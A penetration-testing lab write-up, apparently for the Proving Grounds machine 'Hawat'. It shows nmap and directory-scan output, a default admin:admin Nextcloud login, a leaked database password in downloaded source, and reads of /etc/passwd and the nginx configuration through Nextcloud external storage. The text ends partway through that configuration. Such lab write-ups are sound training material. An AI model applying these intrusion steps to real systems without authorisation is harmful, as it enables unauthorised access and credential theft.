# Hawat

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Wed Jan 12 02:11:25 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hawat/results/192.168.107.147/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hawat/results/192.168.107.147/scans/xml/_full_tcp_nmap.xml" 192.168.107.147
Nmap scan report for 192.168.107.147
Host is up, received user-set (0.30s latency).
Scanned at 2022-01-12 02:11:26 EST for 666s
Not shown: 65527 filtered ports
Reason: 65527 no-responses
PORT      STATE  SERVICE      REASON         VERSION
22/tcp    open   ssh          syn-ack ttl 63 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDj3RK6xsdeO4e9FcGxkWDFkLF6hB7c+1AvLuouW7Hb9yCluZ2mIoIHBm8p8+h8ZefUURi9GirIwsti4lQdcIxKwGepWKjj9/yTKe/sNEWugWUhA2+twlcG16FWSt83UenfW9L8pJ7swSobVFWl3bLcig9vBZxRcP4S90lskZ00v7+ivglQ5ZhUEfbOm4QG9ygqY4pLTFN2jf/z91XhoTANWOrKZNOb+ESbspGxQTEUCHwVNrODS6BDqTTWNj2gZlB3rR3OxkHAiOvBaiKmt3o3IKegyx2LnjnG1s5JxjfjsV3DDesEqgB5TPfLF9SM3ablgqyBvHr1XeMWmqpQoSanb8+oNzQBmodmiARh1ScZQ4YdlAXuZPGae5bgIoCKWj8fWpxAtjvEt1GuoBmfSUrX2IZ0F+TuGLp6r2QZAAyBCc6DkZyisSVRBqgSHiCcUSMMX1s4Q+3ejdMKQdr/sio1F3KrqcxRus9r7QNHe9aPHZQvgqtfILrtRHpCLS1nESk=
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlBMKDw3CXTIbkuaAnYiGGEVUj1gx8Cx0sCphpMw8LfYEwRT39bv6O6K/4/IRdx/55N+IZs9C15K5SoHJbACVI=
|   256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID8bIayyvqAHx2g8sE1rJUia1dcCXeTm0bR6MkIuzYIq
111/tcp   closed rpcbind      reset ttl 63
139/tcp   closed netbios-ssn  reset ttl 63
443/tcp   closed https        reset ttl 63
445/tcp   closed microsoft-ds reset ttl 63
17445/tcp open   unknown      syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Wed, 12 Jan 2022 07:20:51 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>Issue Tracker</title>
|     <link href="/css/bootstrap.min.css" rel="stylesheet" />
|     </head>
|     <body>
|     <section>
|     <div class="container mt-4">
|     <span>
|     <div>
|     href="/login" class="btn btn-primary" style="float:right">Sign In</a> 
|     href="/register" class="btn btn-primary" style="float:right;margin-right:5px">Register</a>
|     </div>
|     </span>
|     <br><br>
|     <table class="table">
|     <thead>
|     <tr>
|     <th>ID</th>
|     <th>Message</th>
|     <th>P
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Wed, 12 Jan 2022 07:20:51 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 12 Jan 2022 07:20:53 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
30455/tcp open   http         syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
|_http-title: W3.CSS
50080/tcp open   http         syn-ack ttl 63 Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
|_http-title: W3.CSS Template
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port17445-TCP:V=7.91%I=9%D=1/12%Time=61DE8152%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,623,"HTTP/1\.1\x20200\x20\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:\x20no-cac
SF:he,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\x20no-cach
SF:e\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text
SF:/html;charset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Wed,\x201
SF:2\x20Jan\x202022\x2007:20:51\x20GMT\r\nConnection:\x20close\r\n\r\n\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\t<head>\n\x20\x20\x20\x20\t<m
SF:eta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20\t<title>Issue\x20Tracker</t
SF:itle>\n\t\t<link\x20href=\"/css/bootstrap\.min\.css\"\x20rel=\"styleshe
SF:et\"\x20/>\n\t</head>\n\t<body>\n\t\x20\x20\x20\x20<section>\n\t\t<div\
SF:x20class=\"container\x20mt-4\">\n\t\t\t<span>\n\x20\t\t\t\n\t\x20\x20\x
SF:20\x20\x20\x20\x20\x20<div>\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20
SF:href=\"/login\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right\
SF:">Sign\x20In</a>\x20\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20href=\"
SF:/register\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right;marg
SF:in-right:5px\">Register</a>\n\t\x20\x20\x20\x20\x20\x20\x20\x20</div>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20</span>\n\t\t\t<br><br>\n\t\t\t<table\x
SF:20class=\"table\">\n\t\t\t<thead>\n\t\t\t\t<tr>\n\t\t\t\t\t<th>ID</th>\
SF:n\t\t\t\t\t<th>Message</th>\n\t\t\t\t\t<th>P")%r(HTTPOptions,12B,"HTTP/
SF:1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:
SF:\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\
SF:x20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Len
SF:gth:\x200\r\nDate:\x20Wed,\x2012\x20Jan\x202022\x2007:20:51\x20GMT\r\nC
SF:onnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r
SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r
SF:\nContent-Length:\x20435\r\nDate:\x20Wed,\x2012\x20Jan\x202022\x2007:20
SF::53\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1></body></html>");
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 2.6.39 (88%), Linux 3.10 - 3.12 (88%), Linux 3.5 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%), Linux 2.6.35 (87%), Linux 4.9 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/12%OT=22%CT=111%CU=%PV=Y%DS=2%DC=T%G=N%TM=61DE81B8%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=10B%TI=Z%II=I%TS=A)
OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 47.329 days (since Thu Nov 25 18:28:27 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   303.11 ms 192.168.49.1
2   303.21 ms 192.168.107.147

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 12 02:22:32 2022 -- 1 IP address (1 host up) scanned in 666.73 seconds
```


## 30455 - Web

![](Pasted%20image%2020220121234608.png)

Source Code/ nmap scan

```
# Nmap 7.91 scan initiated Wed Jan 12 02:22:32 2022 as: nmap -vv --reason -Pn -T4 -sV -p 30455 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hawat/results/192.168.107.147/scans/tcp30455/tcp_30455_http_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hawat/results/192.168.107.147/scans/tcp30455/xml/tcp_30455_http_nmap.xml" 192.168.107.147
Nmap scan report for 192.168.107.147
Host is up, received user-set (0.27s latency).
Scanned at 2022-01-12 02:22:33 EST for 672s

PORT      STATE SERVICE REASON         VERSION
30455/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-chrono: Request times for /; avg: 677.70ms; min: 576.19ms; max: 715.68ms
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.107.147
|     
|     Path: http://192.168.107.147:30455/
|     Line number: 121
|     Comment: 
|         <!-- Test adds with URL/?title=test -->
|     
|     Path: http://192.168.107.147:30455/4/w3.css
|     Line number: 1
|     Comment: 
|         /* W3.CSS 4.15 December 2020 by Jan Egil and Borge Refsnes */
|     
|     Path: http://192.168.107.147:30455/4/w3.css
|     Line number: 3
|     Comment: 
|         /* Extract from normalize.css by Nicolas Gallagher and Jonathan Neal git.io/normalize */
|     
|     Path: http://192.168.107.147:30455/4/w3.css
|     Line number: 26
|     Comment: 
|         /* End extract */
|     
|     Path: http://192.168.107.147:30455/4/w3.css
|     Line number: 151
|     Comment: 
|_        /* Colors */
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-date: Wed, 12 Jan 2022 07:22:55 GMT; +2s from local time.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis)
| http-enum: 
|_  /phpinfo.php: Possible information file
|_http-errors: Couldn't find any error pages.
|_http-feed: Couldn't find any feeds.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers: 
|   Server: nginx/1.18.0
|   Date: Wed, 12 Jan 2022 07:22:56 GMT
|   Content-Type: text/html; charset=UTF-8
|   Connection: close
|   X-Powered-By: PHP/7.4.15
|   
|_  (Request type: HEAD)
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-malware-host: Host appears to be clean
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-mobileversion-checker: No mobile version detected.
| http-php-version: Logo query returned unknown hash bc497628014ec6effb66a8c1afc6f283
| Credits query returned unknown hash bc497628014ec6effb66a8c1afc6f283
|_Version from header x-powered-by: PHP/7.4.15
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-server-header: nginx/1.18.0
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1
|     /4/
|       css: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /4/
|   Total files found (by extension):
|_    Other: 1; css: 1
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: W3.CSS
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-vhosts: 
|_128 names had status 200
|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 12 02:33:45 2022 -- 1 IP address (1 host up) scanned in 673.14 seconds
```

### Testing Parameter


![](Pasted%20image%2020220121234452.png)

![](Pasted%20image%2020220121234546.png)

### Phpinfo

![](Pasted%20image%2020220121234700.png)

## 50080 - Web - Apache httpd 2.4.46

![](Pasted%20image%2020220121232436.png)

Autorecon feroxbuster with a big wordlist reveals directory `/cloud`

`feroxbuster -u http://192.168.107.147:50080/ -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -o "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hawat/results/192.168.107.147/scans/tcp50080/tcp_50080_http_feroxbuster_big.txt"`

```
403       42l       96w        0c http://192.168.107.147:50080/cgi-bin/.asp
403       42l       96w        0c http://192.168.107.147:50080/cgi-bin/.aspx
403       42l       96w        0c http://192.168.107.147:50080/cgi-bin/.jsp
301        7l       20w      243c http://192.168.107.147:50080/cloud
301        7l       20w      244c http://192.168.107.147:50080/images
200      192l      740w     9088c http://192.168.107.147:50080/index.html
```

### Nextcloud
![](Pasted%20image%2020220121232538.png)


Guessed credentials of `admin`:`admin`

![](Pasted%20image%2020220121232702.png)

![](Pasted%20image%2020220121232806.png)

Firstly I went to settings to change the Language

![](Pasted%20image%2020220121232903.png)


Then I can download the Issue Tracker source code

### Source Code Found

```
┌──(kali㉿kali)-[/tmp]
└─$ dtrx issuetracker.zip                                                                                                                                           1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd issuetracker                                                                                                                                                 1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/issuetracker]
└─$ ls                                                                                                                                                              1 ⚙
HELP.md  mvnw  mvnw.cmd  pom.xml  src
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/issuetracker]
└─$ ls -alR                                                                                                                                                         1 ⚙
.:
total 40
drwxrwxr-x  3 kali kali  4096 Jan 21 10:37 .
drwxrwxrwt 18 root root  4096 Jan 21 10:35 ..
-rw-r--r--  1 kali kali  1495 Feb  1  2021 HELP.md
-rwxr-xr-x  1 kali kali 10070 Feb  1  2021 mvnw
-rw-r--r--  1 kali kali  6608 Feb  1  2021 mvnw.cmd
-rw-rw-r--  1 kali kali  2248 Feb  4  2021 pom.xml
drwxr-xr-x  4 kali kali  4096 Feb  1  2021 src

./src:
total 16
drwxr-xr-x 4 kali kali 4096 Feb  1  2021 .
drwxrwxr-x 3 kali kali 4096 Jan 21 10:37 ..
drwxr-xr-x 4 kali kali 4096 Feb  1  2021 main
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 test

./src/main:
total 16
drwxr-xr-x 4 kali kali 4096 Feb  1  2021 .
drwxr-xr-x 4 kali kali 4096 Feb  1  2021 ..
drwxr-xr-x 3 kali kali 4096 Feb  2  2021 java
drwxr-xr-x 4 kali kali 4096 Feb  3  2021 resources

./src/main/java:
total 12
drwxr-xr-x 3 kali kali 4096 Feb  2  2021 .
drwxr-xr-x 4 kali kali 4096 Feb  1  2021 ..
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 com

./src/main/java/com:
total 12
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 .
drwxr-xr-x 3 kali kali 4096 Feb  2  2021 ..
drwxr-xr-x 3 kali kali 4096 Feb  2  2021 issue

./src/main/java/com/issue:
total 12
drwxr-xr-x 3 kali kali 4096 Feb  2  2021 .
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 ..
drwxr-xr-x 5 kali kali 4096 Jan 21 10:36 tracker

./src/main/java/com/issue/tracker:
total 24
drwxr-xr-x 5 kali kali 4096 Jan 21 10:36 .
drwxr-xr-x 3 kali kali 4096 Feb  2  2021 ..
drwxrwxr-x 2 kali kali 4096 Mar  2  2021 config
drwxrwxr-x 2 kali kali 4096 Mar  2  2021 issues
-rw-r--r-- 1 kali kali  312 Feb  1  2021 TrackerApplication.java
drwxrwxr-x 2 kali kali 4096 Jan 21 10:36 users

./src/main/java/com/issue/tracker/config:
total 12
drwxrwxr-x 2 kali kali 4096 Mar  2  2021 .
drwxr-xr-x 5 kali kali 4096 Jan 21 10:36 ..
-rw-rw-r-- 1 kali kali 1671 Mar  2  2021 WebSecurityConfig.java

./src/main/java/com/issue/tracker/issues:
total 28
drwxrwxr-x 2 kali kali 4096 Mar  2  2021 .
drwxr-xr-x 5 kali kali 4096 Jan 21 10:36 ..
-rw-rw-r-- 1 kali kali 2826 Mar  2  2021 IssueController.java
-rw-rw-r-- 1 kali kali  248 Feb  2  2021 IssueInterface.java
-rw-rw-r-- 1 kali kali 1077 Feb  2  2021 Issue.java
-rw-rw-r-- 1 kali kali  233 Feb  2  2021 IssueRepository.java
-rw-rw-r-- 1 kali kali  689 Feb  2  2021 IssueService.java

./src/main/java/com/issue/tracker/users:
total 36
drwxrwxr-x 2 kali kali 4096 Jan 21 10:36 .
drwxr-xr-x 5 kali kali 4096 Jan 21 10:36 ..
-rw-rw-r-- 1 kali kali  551 Feb  3  2021 Role.java
-rw-rw-r-- 1 kali kali 3044 Feb  5  2021 UserController.java
-rw-rw-r-- 1 kali kali 1620 Feb  5  2021 UserDetailsServiceImpl.java
-rw-rw-r-- 1 kali kali  302 Feb  4  2021 UserInterface.java
-rw-rw-r-- 1 kali kali  810 Feb  4  2021 UserService.java
-rw-rw-r-- 1 kali kali 1423 Feb  5  2021 Users.java
-rw-rw-r-- 1 kali kali  248 Feb  5  2021 UsersRepository.java

./src/main/resources:
total 20
drwxr-xr-x 4 kali kali 4096 Feb  3  2021 .
drwxr-xr-x 4 kali kali 4096 Feb  1  2021 ..
-rw-r--r-- 1 kali kali  289 Feb  8  2021 application.properties
drwxr-xr-x 4 kali kali 4096 Feb  2  2021 static
drwxr-xr-x 2 kali kali 4096 Feb  4  2021 templates

./src/main/resources/static:
total 16
drwxr-xr-x 4 kali kali 4096 Feb  2  2021 .
drwxr-xr-x 4 kali kali 4096 Feb  3  2021 ..
drwxrwxr-x 2 kali kali 4096 Feb  2  2021 css
drwxrwxr-x 2 kali kali 4096 Feb  2  2021 js

./src/main/resources/static/css:
total 168
drwxrwxr-x 2 kali kali   4096 Feb  2  2021 .
drwxr-xr-x 4 kali kali   4096 Feb  2  2021 ..
-rw-rw-r-- 1 kali kali 161409 Feb  2  2021 bootstrap.min.css

./src/main/resources/static/js:
total 392
drwxrwxr-x 2 kali kali   4096 Feb  2  2021 .
drwxr-xr-x 4 kali kali   4096 Feb  2  2021 ..
-rw-rw-r-- 1 kali kali  63467 Feb  2  2021 bootstrap.min.js
-rw-rw-r-- 1 kali kali 280364 May  1  2019 jquery-3.4.1.js
-rw-rw-r-- 1 kali kali    568 Feb  2  2021 main.js
-rw-rw-r-- 1 kali kali  40808 Oct 26  1985 sweetalert.min.js

./src/main/resources/templates:
total 40
drwxr-xr-x 2 kali kali 4096 Feb  4  2021 .
drwxr-xr-x 4 kali kali 4096 Feb  3  2021 ..
-rw-rw-r-- 1 kali kali  756 Feb  5  2021 fragments.html
-rw-rw-r-- 1 kali kali  748 Feb  4  2021 index.html
-rw-rw-r-- 1 kali kali 1372 Feb  5  2021 issue_form.html
-rw-rw-r-- 1 kali kali 1008 Feb  4  2021 issue_index.html
-rw-rw-r-- 1 kali kali  568 Feb  4  2021 layout.html
-rw-rw-r-- 1 kali kali 1164 Feb  5  2021 login.html
-rw-rw-r-- 1 kali kali 1234 Feb  5  2021 user_form.html
-rw-rw-r-- 1 kali kali  954 Feb  5  2021 user_index.html

./src/test:
total 12
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 .
drwxr-xr-x 4 kali kali 4096 Feb  1  2021 ..
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 java

./src/test/java:
total 12
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 .
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 ..
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 com

./src/test/java/com:
total 12
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 .
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 ..
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 issue

./src/test/java/com/issue:
total 12
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 .
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 ..
drwxr-xr-x 2 kali kali 4096 Feb  1  2021 tracker

./src/test/java/com/issue/tracker:
total 12
drwxr-xr-x 2 kali kali 4096 Feb  1  2021 .
drwxr-xr-x 3 kali kali 4096 Feb  1  2021 ..
-rw-r--r-- 1 kali kali  210 Feb  1  2021 TrackerApplicationTests.java
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/issuetracker]
└─$                    
```

#### Interesting files

```
┌──(kali㉿kali)-[/tmp/issuetracker]
└─$ cat pom.xml                                                                                                                                                     1 ⚙
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
        <modelVersion>4.0.0</modelVersion>
        <parent>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-parent</artifactId>
                <version>2.4.2</version>
                <relativePath/> <!-- lookup parent from repository -->
        </parent>
        <groupId>com.issue</groupId>
        <artifactId>tracker</artifactId>
        <version>0.0.1-SNAPSHOT</version>
        <name>tracker</name>
        <description>Issue Tracker Application</description>
        <properties>
                <java.version>11</java.version>
        </properties>
        <dependencies>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-data-jpa</artifactId>
                </dependency>
                <dependency>
                  <groupId>org.springframework.boot</groupId>
                  <artifactId>spring-boot-starter-security</artifactId>
                </dependency>
                <dependency>
                  <groupId>org.springframework.security</groupId>
                  <artifactId>spring-security-test</artifactId>
                  <scope>test</scope>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-thymeleaf</artifactId>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-web</artifactId>
                </dependency>
                <dependency>
                    <groupId>org.thymeleaf.extras</groupId>
                    <artifactId>thymeleaf-extras-springsecurity5</artifactId>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-devtools</artifactId>
                        <scope>runtime</scope>
                        <optional>true</optional>
                </dependency>
                <dependency>
                        <groupId>mysql</groupId>
                        <artifactId>mysql-connector-java</artifactId>
                        <scope>runtime</scope>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-test</artifactId>
                        <scope>test</scope>
                </dependency>
        </dependencies>

        <build>
                <plugins>
                        <plugin>
                                <groupId>org.springframework.boot</groupId>
                                <artifactId>spring-boot-maven-plugin</artifactId>
                        </plugin>
                </plugins>
        </build>

</project>
```


```
┌──(kali㉿kali)-[/tmp/issuetracker]
└─$ cat src/main/resources/application.properties                                                                                                                   1 ⚙
spring.datasource.url=jdbc:mysql://localhost:3306/issue_tracker?serverTimeZone=UTC
spring.datasource.username=issue_user
spring.datasource.password=ManagementInsideOld797
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
server.port=17445

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/issuetracker]
└─$               
```

### More nextcloud testing

![](Pasted%20image%2020220122084102.png)

![](Pasted%20image%2020220122083856.png)

I enabled external storage support (required you to put your credentials)

Go to Settings -> Administration -> External Storage

![](Pasted%20image%2020220122084024.png)


![](Pasted%20image%2020220122084139.png)


Then go back to files -> External storage -> Local

![](Pasted%20image%2020220122084248.png)

![](Pasted%20image%2020220122084312.png)

Can find the clinton user, as suggested by the web tracker.

Insert SSH key? Failed for /home/clinton

### File Read/write

`/etc/passwd` file
```
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
dhcpcd:x:977:977:dhcpcd privilege separation:/:/usr/bin/nologin
clinton:x:1000:1000::/home/clinton:/bin/bash
mysql:x:976:976:MariaDB:/var/lib/mysql:/usr/bin/nologin
```


`/etc/nginx/nginx/conf`

```
user root;
worker_processes  1;

#error_log  logs/error.log;
#error_log  logs/error.log  notice;
#error_log  logs/error.log  info;

#pid        logs/nginx.pid;


events {
    worker_connections  1024;
}


http {
    include       mime.types;
    default_type  application/octet-stream;

    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
    #                  '$status $body_bytes_sent "$http_referer" '
    #                  '"$http_user_agent" "$http_x_forwarded_for"';

     # access_log  logs/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    #keepalive_timeout  0;
    keepalive_timeout  65;

    #gzip  on;

    server {
        listen       30455;
        server_name  localhost;

        #charset koi8-r;

        #access_log  logs/host.access.log  main;

        location / {
            root   /srv/http;
            index index.php index.html index.htm;
        }

        #error_page  404              /404.html;

        # redirect server error pages to the static page /50x.html
        #
        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   /srv/http;
        }

        # proxy the PHP scripts to Apache listening on 127.0.0.1:80
        #
        #location ~ \.php$ {
        #    proxy_pass   http://127.0.0.1;
        #}

        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
        #
        #location ~ \.php$ {
        #    root           html;
        #    fastcgi_pass   127.0.0.1:9000;
        #    fastcgi_index  index.php;
        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;
        #    include        fastcgi_params;
        #}

